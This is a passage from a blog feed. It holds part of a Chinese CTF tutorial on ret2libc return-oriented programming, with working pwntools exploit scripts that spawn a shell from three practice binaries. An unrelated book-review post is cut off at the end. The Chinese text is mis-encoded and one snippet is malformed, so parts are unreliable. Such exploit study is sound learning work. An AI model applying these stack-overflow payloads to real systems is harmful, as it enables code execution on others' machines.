class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop# strings ret2libc1 | grep system</span><br><span class="line">system</span><br><span class="line">system@@GLIBC_2.0</span><br><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop# strings ret2libc1 | grep /bin/sh</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure><p>æ£€æŸ¥ä¿æŠ¤ï¼Œå‘ç°å¼€å¯äº†NXé˜²æŠ¤ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½åœ¨å †æ ˆä¸­æ‰§è¡Œshellcodeã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/root/pwn/rop/ret2libc1'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>ç¨‹åºåæ±‡ç¼–å¦‚ä¸‹</p><p><img src="/2023/07/13/ROPå­¦ä¹ II/2.png" alt="2"></p><p>è¿™é‡Œæˆ‘ä»¬çš„å…·ä½“æ–¹æ³•æ˜¯ï¼Œé€šè¿‡getså‡½æ•°ä¼ å‚æ•°æº¢å‡ºã€‚ä½¿å¾—<code>main</code>å‡½æ•°èƒ½å¤Ÿreturnåˆ°<code>system</code>å‡½æ•°çš„åœ°å€ï¼Œå¹¶å°†<code>/bin/sh</code>å­—ç¬¦ä¸²åœ°å€ä¼ å…¥åˆ°<code>system</code>å‡½æ•°ä¸­ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•è·å–<code>system</code>å‡½æ•°å’Œ<code>/bin/sh</code>å­—ç¬¦ä¸²åœ¨ç¨‹åºä¸­çš„åœ°å€å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºè·å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">[*] <span class="string">'/root/pwn/rop/ret2libc1'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.plt[<span class="string">"system"</span>]</span><br><span class="line"><span class="number">134513760</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">134513760</span>)</span><br><span class="line"><span class="string">'0x8048460'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="number">134514464</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">134514464</span>)</span><br><span class="line"><span class="string">'0x8048720'</span></span><br></pre></td></tr></table></figure><p>æ¥ç€æˆ‘ä»¬é€šè¿‡gdbåŠ¨æ€è°ƒè¯•è®¡ç®—éœ€è¦æº¢å‡ºçš„æ•°æ®å¤§å°ã€‚é€šè¿‡<code>stack</code>å‘½ä»¤æŸ¥çœ‹eaxåˆ°ebpçš„è·ç¦»ã€‚</p><p><img src="/2023/07/13/ROPå­¦ä¹ II/3.png" alt="3"></p><p>éœ€è¦æº¢å‡ºçš„æ•°æ®å¤§å°ä¸º<code>0xffffd5b8 - 0xffffd54c</code>å†åŠ ä¸Šå››å­—èŠ‚ebpä¸€å…±112å­—èŠ‚ã€‚</p><p>ROPé“¾æ„é€ å¦‚ä¸‹</p><p><img src="/2023/07/13/ROPå­¦ä¹ II/6.png" alt="6"></p><p>ä¹‹åæˆ‘ä»¬å¯ä»¥æ„é€ exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x8048460</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">112</span> + p32(system_plt) + <span class="string">b'B'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç¨‹åºè·å–shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop<span class="comment"># python3 exp_ret2libc1.py</span></span><br><span class="line">[+] Starting local process <span class="string">'./ret2libc1'</span>: pid <span class="number">16491</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">$ pwd</span><br><span class="line">/root/pwn/rop</span><br></pre></td></tr></table></figure><h4 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h4><p>æœ¬é¢˜å’Œ<code>ret2libc1</code>çš„åŒºåˆ«æ˜¯ï¼Œç¨‹åºä¸­æ²¡æœ‰<code>/bin/sh</code>ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±å°†<code>/bin/sh</code>å­—ç¬¦ä¸²å†™å…¥åˆ°ç¨‹åºä¸­è¿›è¡Œæ§åˆ¶ã€‚</p><p>é€šè¿‡åæ±‡ç¼–æŸ¥çœ‹æˆ‘ä»¬åº”è¯¥å°†<code>/bin/sh</code>å†™å…¥åˆ°bssæ®µçš„<code>buf2</code>ä¸­ã€‚</p><p><img src="/2023/07/13/ROPå­¦ä¹ II/4.png" alt="4"></p><p>æ‰€ä»¥æˆ‘ä»¬çš„æ€è·¯æ˜¯é¦–å…ˆROPåˆ°getså‡½æ•°ï¼Œåœ¨getså‡½æ•°ä¸­å°†<code>/bin/sh</code>è¯»å–å¹¶æ”¾å…¥<code>buf2</code>ã€‚ä¹‹åç»§ç»­ROPåˆ°<code>system@plt</code>å³å¯ã€‚</p><p>ROPé“¾æ„é€ å¦‚ä¸‹</p><p><img src="/2023/07/13/ROPå­¦ä¹ II/5.png" alt="5"></p><p>expæ„é€ å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">buf2 = elf.symbols[<span class="string">"buf2"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="number">112</span>*<span class="string">b'A'</span> + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h4><p>æœ¬é¢˜ç¨‹åºä¸­æ²¡æœ‰<code>system</code>å‡½æ•°ä¹Ÿæ²¡æœ‰<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æä¾›äº†<code>so</code>æ–‡ä»¶ã€‚å¯¹äº<code>/bin/sh</code>å­—ç¬¦ä¸²æˆ‘ä»¬å¯ä»¥ç”¨å‰é¢çš„æ–¹æ³•å†™å…¥ï¼Œä½†systemå‡½æ•°æ˜¯æ— æ³•å†™å…¥çš„ã€‚</p><p>ç„¶è€Œåœ¨linuxå»¶è¿Ÿç»‘å®šæœºåˆ¶ä¸­ï¼Œå½“ç¨‹åºè°ƒç”¨åº“å‡½æ•°æ—¶ï¼Œä¼šå°†<code>libc.so</code>æ–‡ä»¶ä¸­çš„å‡½æ•°åœ°å€å†™åˆ°ç¨‹åºçš„gotè¡¨ä¸­ï¼Œè°ƒç”¨æ—¶ä¼šè·³è½¬åˆ°gotè¡¨æ‰€å†™çš„åœ°å€ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚æœè¦è°ƒç”¨systemå‡½æ•°ï¼Œå°±è¦çŸ¥é“ä»–çš„gotè¡¨ä¸­çš„åœ°å€ï¼Œgotè¡¨ä¸­çš„åœ°å€æŒ‡çš„å°±æ˜¯å½“ç³»ç»Ÿå°†libcï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰åŠ è½½åˆ°å†…å­˜ä¸­æ—¶ï¼Œåº“ä¸­çš„å‡½æ•°çš„åœ°å€ã€‚ä½†libcè¢«åŠ è½½åˆ°çš„å†…å­˜çš„ä½ç½®æ˜¯éšæœºçš„ï¼Œæˆ‘ä»¬æ— ä»å¾—çŸ¥ã€‚<br>ä½†æ˜¯ï¼ŒåŒä¸€ç‰ˆæœ¬çš„libcçš„ä¸¤ä¸ªåº“å‡½æ•°åœ¨libcä¸­çš„ç›¸å¯¹ä½ç½®æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥çŸ¥é“ä¸€ä¸ªå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„gotè¡¨åœ°å€ï¼Œç„¶åç¡®å®šlibcçš„ç‰ˆæœ¬ï¼Œå°±å¯ä»¥åŠ ä¸Šå’Œsystemå‡½æ•°çš„åç§»ï¼Œä»è€Œå¾—åˆ°systemå‡½æ•°çš„çœŸå®åœ°å€ï¼Œå³gotè¡¨åœ°å€ã€‚<br>è¿™é‡Œæˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªputså‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨putså‡½æ•°ï¼Œå°†ä¸€ä¸ªå·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„gotè¡¨åœ°å€æ‰“å°å‡ºæ¥ï¼Œç„¶åå†æ ¹æ®åœ°å€è·å–libcç‰ˆæœ¬ï¼Œç¡®å®šåç§»ï¼Œå¾—åˆ°çœŸå®åœ°å€ã€‚</p><p><img src="/2023/07/13/ROPå­¦ä¹ II/8.png" alt="8"></p><p>é¦–å…ˆstringsçœ‹ä¸€ä¸‹ç¨‹åºä¸­çš„<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œæ²¡æœ‰æ‰¾åˆ°<code>/bin/sh</code>å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç”¨<code>sh</code>ä»£æ›¿ï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop/ret2libc3# strings ret2libc3 | grep /bin/sh</span><br><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop/ret2libc3# strings ret2libc3 | grep sh</span><br><span class="line">fflush</span><br><span class="line">.shstrtab</span><br><span class="line">.gnu.hash</span><br><span class="line">fflush@@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>å› æ­¤ROPé“¾æ„é€ å¦‚ä¸‹</p><p><img src="/2023/07/13/ROPå­¦ä¹ II/7.png" alt="7"></p><p>æº¢å‡ºæ•°æ®å¤§å°é€šè¿‡åç¼–è¯‘æŸ¥çœ‹ï¼Œå¾—åˆ°å¤§å°ä¸º<code>56+4=60</code>å­—èŠ‚</p><p><img src="/2023/07/13/ROPå­¦ä¹ II/9.png" alt="9"></p><p>æ¥ç€æˆ‘ä»¬éœ€è¦çŸ¥é“<code>system</code>å‡½æ•°åœ¨ç¨‹åºä¸­çš„çœŸå®åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line">system@plt address  = libc.symbols[<span class="string">"system"</span>] - libc.symbols[<span class="string">"puts"</span>] + puts_plt</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆexpæ„é€ å¦‚ä¸‹æ„é€ å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>) <span class="comment">#é€šè¿‡lddæ‰¾åˆ°ç¨‹åºåœ¨æœ¬æœºçš„libcåœ°å€</span></span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(elf.got[<span class="string">"puts"</span>])) <span class="comment">#ä¼ å…¥çš„æ˜¯å­—ç¬¦ä¸²</span></span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">puts_plt = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) <span class="comment">#å¾—åˆ°putså‡½æ•°çš„çœŸå®åœ°å€</span></span><br><span class="line">success(<span class="string">"puts_plt -&gt; &#123;:#x&#125;"</span>.format(puts_plt))</span><br><span class="line">payload = flat(cyclic(<span class="number">60</span>),puts_plt+libc.symbols[<span class="string">"system"</span>]-libc.symbols[<span class="string">"puts"</span>],<span class="number">0xdeadbeef</span>,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h4><p><a href="https://www.bilibili.com/video/BV1854y1y7Ro" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1854y1y7Ro</a></p><p><a href="https://www.freebuf.com/articles/web/283330.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/283330.html</a></p><p><a href="https://luomuxiaoxiao.com/?p=578" target="_blank" rel="noopener">https://luomuxiaoxiao.com/?p=578</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h4&gt;&lt;p&gt;ä¸Šä¸€èŠ‚é€šè¿‡ä¸€ä¸ªç®€å•çš„&lt;code&gt;ret2syscall&lt;/code&gt;é¢˜ç›®è®¤è¯†äº†ROPã€‚æœ¬èŠ‚å°†é€šè¿‡ä¸‰é“&lt;code&gt;ret2libc&lt;/code
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>è¯»ä¹¦åˆ†äº«IV</title>
    <link href="elssm.github.io/2023/05/09/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABIV/"/>
    <id>elssm.github.io/2023/05/09/è¯»ä¹¦åˆ†äº«IV/</id>
    <published>2023-05-09T11:23:10.000Z</published>
    <updated>2023-10-09T12:17:16.220Z</updated>
    
    <content type="html"><![CDATA[<h4 id="æ¥šæ±‰åŒé›„"><a href="#æ¥šæ±‰åŒé›„" class="headerlink" title="æ¥šæ±‰åŒé›„"></a>æ¥šæ±‰åŒé›„</h4><p><img src="/2023/05/09/è¯»ä¹¦åˆ†äº«IV/1.jpg" alt="1" style="zoom:80%;"></p><p><strong>è§è¯†è¿™ä¸œè¥¿ï¼Œå…¶å®è¯´åˆ°åº•ï¼Œå°±æ˜¯åœ¨å¤§é‡çš„ç†è®ºå’Œå®é™…ç»“åˆä¸èä¼šè´¯é€šåï¼Œæ˜ç™½äº†äº‹ç‰©å‘å±•ã€è¿è¡Œçš„è§„å¾‹ã€‚</strong><br>ä½œä¸ºä¸€æœ¬å†å²ä¹¦ï¼Œå®ƒå¾ˆç‰¹åˆ«ï¼šè§’åº¦å²æ— å‰ä¾‹ã€‚é€šè¿‡æ¥šæ±‰äº‰éœ¸æ—¶æœŸ9åœºè‘—åæˆ˜å½¹æ¥è®²è¿°è¿™æ®µå†å²ï¼ŒæƒåŠ›æ–—äº‰ã€å…µæ³•è°‹ç•¥ã€ç¾¤é›„æ±‡èšã€å°½æ˜¾äººæ€§ï¼›ä½œä¸ºä¸€æœ¬å†å²ä¹¦ï¼Œå®ƒé€šä¿—åˆæœ‰æ·±åº¦ï¼šä¸è¿½çƒ­ç‚¹ï¼Œæ²¡æœ‰å…«å¦ï¼Œä»è§£æ„å†å²çš„åº•å±‚é€»è¾‘å…¥æ‰‹ï¼Œå†…å®¹æ·±åˆ»ä¸”å…¨é¢é€å½»ã€‚å…¨ç³»åˆ—ä½œå“ä»å…ˆç§¦æ—¶æœŸè®²åˆ°æ¸…æœæœ«å¹´ï¼Œè´¯ç©¿2300å¹´ä¸­å›½å†å²ï¼›ä½œä¸ºä¸€æœ¬å†å²ä¹¦ï¼Œå®ƒæ›¾ä¸€åº¦éš¾äº§ï¼šä¿è¯åŸæ±åŸå‘³çš„åŒæ—¶ï¼Œå…¼é¡¾å²å®è€ƒè¯ã€‚ä¸ºäº†ä¿è¯å†…å®¹è¿˜åŸå²å®ç°åœºï¼Œå®ƒç»è¿‡äº†æ— æ•°æ¬¡çš„å®¡è¯»ä¿®æ”¹ã€‚ä¸ºäº†æƒ³å°½å„ç§åŠæ³•ï¼Œè®©è¯»è€…é˜…è¯»ä½“éªŒæ›´ç›´è§‚ï¼Œé…ç»å…¸æ‰‹ç»˜ä½œæˆ˜å›¾äº”åä½™å¹…ï¼Œåå¤ä¿®æ”¹ï¼ŒåŠ›æ±‚å‡†ç¡®ï¼›ä½œä¸ºä¸€æœ¬å†å²ä¹¦ï¼Œå®ƒä»è§£æ„å†å²çš„åº•å±‚é€»è¾‘å…¥æ‰‹ï¼šè¯¦ç»†å›ç­”æ¯ä¸€ä¸ªä¹‹å‰æˆ‘ä»¬çœ‹å†å²æ—¶çš±çœ‰å¤´ã€æ— æ³•è¯´é€šçš„å…³é”®ç‚¹ã€‚</p><h4 id="åŠ¨ç‰©å†œåœº"><a href="#åŠ¨ç‰©å†œåœº" class="headerlink" title="åŠ¨ç‰©å†œåœº"></a>åŠ¨ç‰©å†œåœº</h4><p><img src="/2023/05/09/è¯»ä¹¦åˆ†äº«IV/2.jpg" alt="2" style="zoom:50%;"></p><p><strong>ä½ ä»¬æœ‰ä½ ä»¬çš„ä½ç­‰åŠ¨ç‰©éœ€è¦å¯¹ä»˜ï¼Œæˆ‘ä»¬æœ‰æˆ‘ä»¬çš„ä¸‹å±‚é˜¶çº§éœ€è¦æ‘†å¹³ï¼</strong></p><p>ã€ŠåŠ¨ç‰©å†œåœºã€‹æ˜¯å¥¥å¨å°”æœ€ä¼˜ç§€çš„ä½œå“ä¹‹ä¸€ï¼Œæ˜¯ä¸€åˆ™å…¥æœ¨ä¸‰åˆ†çš„åä¹Œæ‰˜çš„æ”¿æ²»è®½å–»å¯“è¨€ã€‚å†œåœºçš„ä¸€ç¾¤åŠ¨ç‰©æˆåŠŸåœ°è¿›è¡Œäº†ä¸€åœºâ€œé©å‘½â€ï¼Œå°†å‹æ¦¨ä»–ä»¬çš„äººç±»ä¸œå®¶èµ¶å‡ºå†œåœºï¼Œå»ºç«‹èµ·ä¸€ä¸ªå¹³ç­‰çš„åŠ¨ç‰©ç¤¾ä¼šã€‚ç„¶è€Œï¼ŒåŠ¨ç‰©é¢†è¢–ï¼Œé‚£äº›èªæ˜çš„çŒªä»¬æœ€ç»ˆå´ç¯¡å¤ºäº†é©å‘½çš„æœå®ï¼Œæˆä¸ºæ¯”äººç±»ä¸œå®¶æ›´åŠ ç‹¬è£å’Œææƒçš„ç»Ÿæ²»è€…ã€‚</p><p>ç¥ä½œäº†å±äºæ˜¯ã€‚ä¹”æ²»å¥¥å¨å°”yydsï¼</p><h4 id="å°å··äººå®¶"><a href="#å°å··äººå®¶" class="headerlink" title="å°å··äººå®¶"></a>å°å··äººå®¶</h4><p><img src="/2023/05/09/è¯»ä¹¦åˆ†äº«IV/3.jpg" alt="3" style="zoom:50%;"></p><p><strong>å†ç„¦è™‘ï¼Œå†æ‹…å¿ƒï¼Œæ—¥å­è¿˜æ˜¯ç…§å¸¸è¿‡ï¼Œæ—¶é—´åœ¨æŸ´ç±³æ²¹ç›ä¸­ä¸åŠ¨å£°è‰²åœ°å‘å‰æµæ·Œ</strong></p><p>ã€Šå°å··äººå®¶ã€‹æ”¶é›†ä½œè€…è¿‘å‡ å¹´å†™çš„æ•£æ–‡ã€éšç¬”ã€è¯—æ­Œã€æ‚æ–‡ç­‰è¿‘50ç¯‡ã€‚éƒ¨åˆ†ä½œå“åœ¨ã€Šå—æ–¹å‘¨æœ«ã€‹ã€Šæ–°å®‰æ™šæŠ¥ã€‹ã€Šå®£åŸæ—¥æŠ¥ã€‹ã€Šå®£åŸç”µè§†æŠ¥ã€‹å’Œã€Šæ•¬äº­å±±ã€‹ç­‰å¤„å‘è¡¨è¿‡ã€‚è¿™äº›æ–‡å­—ä¸»è¦æ˜¯ä½œè€…å†™è‡ªå·±ã€å®¶äººã€äº²å‹ã€åŒäº‹ï¼Œå›å¿†å®¶ä¹¡ï¼Œæ„Ÿæ‚Ÿç”Ÿæ´»ï¼ŒæŠ’å‘å¹³æ—¥ç”Ÿæ´»å’Œå·¥ä½œä¸­çš„æ„Ÿæ‚Ÿå’Œéšæƒ³ã€‚ä½œè€…å–æè‡ªç”±ï¼Œç¬”æ³•çµæ´»ï¼Œé€šè¿‡éšç¬”æ•£æ–‡æŠ’å‘å‡ºä»–å¯¹ç”Ÿæ´»çš„æ„Ÿå—ï¼Œç‡çœŸæ¸…æ™°åœ°å±•ç¤ºå‡ºä»–çš„ç²¾ç¥ä¸–ç•Œï¼ŒæœºåŠ¨çµæ´»åœ°å½°æ˜¾å‡ºä»–çš„ä¸ªæ€§æ‰æƒ…ï¼Œä»è€Œè‡ªç”±åœ°è¡¨è¾¾å‡ºä½œè€…çš„å†…å¿ƒä¸–ç•Œã€‚è¯¥æ–‡é›†æ–‡ç¬”ä¼˜ç¾ï¼Œå†…å®¹ç§¯æå‘ä¸Šï¼Œä½œè€…é€šè¿‡å¯¹ç”Ÿæ´»çš„çœŸå®æ„Ÿæ‚Ÿï¼Œå†™å‡ºç”Ÿæ´»ä¸­çš„çœŸå–„ç¾ï¼Œè®´æ­Œäººä¸–é—´è‡³çœŸè‡³çº¯çš„äº²æƒ…ã€å‹æƒ…å’Œçˆ±æƒ…ã€‚æ–‡å­—é£æ ¼ä»‹äºå†œæ‘å’ŒåŸå¸‚ä¹‹é—´ï¼Œæ—¢ä¿å­˜äº†çº¯æœ´çš„å†…æ ¸ï¼Œä¹Ÿåæ˜ äº†åŸå¸‚åŒ–çš„æ–‡æ˜æŠ•å½±ã€‚</p><p>å†™çš„å¾ˆæ¸©é¦¨ï¼Œå–œæ¬¢è¿™ç§çº¯ç²¹çš„æƒ…æ„Ÿï¼ŒçœŸå¿ƒå¸Œæœ›èƒ½è¢«æ‹æˆç”µè§†å‰§ï¼</p><h4 id="å¾®å°˜"><a href="#å¾®å°˜" class="headerlink" title="å¾®å°˜"></a>å¾®å°˜</h4><p><img src="/2023/05/09/è¯»ä¹¦åˆ†äº«IV/4.jpg" alt="4" style="zoom:80%;"></p><p><strong>è¯»æ‡‚ä¸Šä¸€ä»£äººæ®‹ç¼ºåˆä¸°å¯Œçš„äººç”Ÿï¼Œæ‰æ˜¯ä¸‹ä¸€ä»£äººæœ€åŸºç¡€çš„è¯¾ç¨‹</strong></p><p>æœ¬ä¹¦æ”¶å½•äº†é™ˆå¹´å–œ21ç¯‡éè™šæ„æ•…äº‹é›†ã€‚ä¹¦ä¸­å†™äº†ä¸€ç¾¤å¹³å‡¡è€Œæœ´ç´ çš„åŠ³åŠ¨è€…çš„æ•…äº‹ã€‚ä»–ä»¬æ˜¯çˆ†ç ´å·¥ã€è¿çŸ³å·¥ã€ä¹¡æ‘æœ¨åŒ ã€å†œå¤«ã€å†œå¦‡ã€å°ä½œåŠè€æ¿â€¦â€¦è€Œä½œå®¶è‡ªå·±çš„æ•…äº‹ï¼Œè´¯ç©¿å§‹ç»ˆï¼šåœ¨åœ°ä¸‹äº”åƒç±³å¼€å±±ç‚¸çŸ³ï¼Œåœ¨çƒŸå°˜å’Œè½°é¸£ä¸­å…»å®¶ç³Šå£ï¼Œåœ¨å·¥æ£šå’Œå±±é‡ä¸­å†™ä¸‹è¯—ç¯‡ï¼Œè®°å½•å‘½è¿çš„çˆ†è£‚å’Œå¯‚é™ã€‚ä»–ä»¬è™½å†ç»ç”Ÿæ´»çš„ç£¨ç ºï¼Œå´æ·³æœ´è€Œç¡¬æ‰ï¼Œæ²‰é™åœ°è¯‰è¯´å…³äºäº²æƒ…ã€çˆ±æƒ…ã€æ­»äº¡ã€æ¬²æœ›çš„ç”Ÿæ´»ä¸»é¢˜â€¦â€¦è¿™æ˜¯ä¸€æœ¬ç”Ÿå‘½çš„ä¹¦ï¼Œä¹Ÿæ˜¯æ­»äº¡çš„ä¹¦ï¼Œå½’æ ¹åˆ°åº•ï¼Œæ˜¯ä¸€æœ¬ç”Ÿæ´»çš„ä¹¦ã€‚ä¸–ç•Œæ˜¯ä»€ä¹ˆæ ·å­ï¼Ÿç”Ÿæ´»æ˜¯ä»€ä¹ˆæ ·å­ï¼Ÿæˆ‘çš„æ„Ÿè§‰é‡Œï¼Œé™¤äº†ç»µé•¿ã€æ— å¤„ä¸åœ¨çš„é£ï¼Œå…¶ä½™éƒ½æ˜¯å°˜åŸƒï¼Œæˆ‘ä»¬åœ¨å…¶ä¸­å¥”çªï¼ŒåŠªåŠ›ç«™ç¨³ï¼Œä½†æ›´å¤šçš„æ—¶å€™æ˜¯ä¸œå€’è¥¿æ­ªï¼Œèº«ä¸ç”±å·±ã€‚</p><p>å¾®å°˜ï¼Œæˆ‘ä»¬æ¯ä¸ªäººéƒ½æ˜¯ä¸€ç²’å¾®å°˜ï¼Œéšä¸–æ¼‚æµã€‚</p><h4 id="ç½ªä¸ç½š"><a href="#ç½ªä¸ç½š" class="headerlink" title="ç½ªä¸ç½š"></a>ç½ªä¸ç½š</h4><p><img src="/2023/05/09/è¯»ä¹¦åˆ†äº«IV/5.jpg" alt="5" style="zoom:50%;"></p><p><strong>ä¸€ä¸ªäººæƒ³è¦å¸®åŠ©åˆ«äººï¼Œé¦–å…ˆä»–å¾—æœ‰æƒåˆ©è¿™æ ·åš</strong></p><p>å°è¯´æå†™ç©·å¤§å­¦ç”Ÿæ‹‰æ–¯æŸ¯å°”å°¼ç§‘å¤«ä¸ºç”Ÿè®¡æ‰€è¿«ï¼Œå—æ— æ”¿åºœä¸»ä¹‰æ€æƒ³æ¯’å®³ï¼Œç²¾ç¥å¤±å¸¸ï¼Œæ€æ­»æ”¾é«˜åˆ©è´·çš„æˆ¿ä¸œè€å¤ªå©†å’Œå¥¹çš„æ— è¾œçš„å¦¹å¦¹ï¼Œåˆ¶é€ 